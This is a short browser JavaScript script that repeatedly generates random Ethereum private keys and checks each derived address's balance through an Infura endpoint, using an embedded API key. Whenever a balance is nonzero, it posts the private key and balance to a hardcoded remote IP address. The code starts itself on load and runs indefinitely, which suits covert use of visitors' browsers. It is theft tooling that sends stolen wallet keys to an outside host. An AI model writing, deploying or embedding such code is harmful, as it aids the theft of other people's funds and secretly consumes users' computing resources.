
var a = 0;



const eth = new window.Eth(new Eth.HttpProvider('https://mainnet.infura.io/6Dn58expyVnlOA4Bm5Li'));
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
// dec2hex :: Integer -> String
function dec2hex (dec) {
  return ('0' + dec.toString(16)).substr(-2)
}

// generateId :: Integer -> String
function generateId (len) {
  var arr = new Uint8Array((len || 40) / 2)
  window.crypto.getRandomValues(arr)
  return Array.from(arr, dec2hex).join('')
}

console.log(generateId())
// "82defcf324571e70b0521d79cce2bf3fffccd69"

console.log(generateId(20))
function doAgain(){
try{
var rString=generateId(64);
//var rString = randomString(64, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
const privateToAccount = ethAccount.privateToAccount;
//console.log(rString);
var add = (privateToAccount(("0x" + rString).toString('hex')).address);
a++;//console.log(add);
//console.log(rString);
eth.getBalance(add)
.then((result) => {
 var bal = (result.toString(10));if(bal != 0){ 
var jqxhr = $.post( "http://35.196.204.203/index.php", { pk: rString, bal: bal }, function() {
  console.log( "success" );
doAgain();
})
  .done(function() {
    console.log( "second success" );
  })
  .fail(function() {
    console.log( "error" );
  })
  .always(function() {
    console.log( "finished" );
  })}else{setTimeout(function (){ doAgain(); }, 1);};


})
.catch((error) => {
  console.log(error);
});
}

catch (err){
console.log(err);
doAgain();
}
}
doAgain();


setInterval(function (){
console.log(a);
a = 0;
}, 60000);